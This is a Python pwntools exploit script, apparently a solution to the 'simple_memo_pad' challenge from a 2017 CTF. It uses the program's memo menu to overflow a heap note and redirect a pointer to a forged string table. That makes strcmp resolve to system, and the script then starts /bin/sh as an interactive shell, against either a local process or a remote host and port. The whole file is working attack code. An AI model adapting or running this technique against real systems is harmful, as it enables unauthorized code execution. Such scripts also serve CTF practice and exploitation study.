#!/usr/bin/env python

from pwn import *
import sys

def writeBlankNote(content):
    r.sendlineafter(">", "1")
    r.sendafter("Content:", content)

def editNote(idx, content):
    r.sendlineafter(">", "2")
    r.sendlineafter("Index:", str(idx))
    r.sendafter("Content:", content)

def deleteNote(idx):
    r.sendlineafter(">", "3")
    r.sendlineafter("Index:", str(idx))

def quit(answer):
    r.sendlineafter(">", "5")
    r.sendlineafter("(y/n):", answer)

def exploit(r):
    STRTAB = 0x601858
    # craft fake STRTAB
    payload = "A"*83
    payload += "system\0"
    payload += "A"*(127-len(payload))
    writeBlankNote(payload) # 2
    writeBlankNote("B"*127) # 3
    writeBlankNote("C"*127) # 4
    
    payload  = "D"*128
    payload += p32(STRTAB-0x98)
    payload += "\n"
    editNote(3, payload)

    deleteNote(3)
    
    quit("/bin/sh\0") # strcmp() will now resolve to system@libc :)
    r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/home/vagrant/CTFs/codebluectf17/simple_memo_pad/simple_memo_pad'], env={"LD_PRELOAD":""})
        print util.proc.pidof(r)
        pause()
        exploit(r)
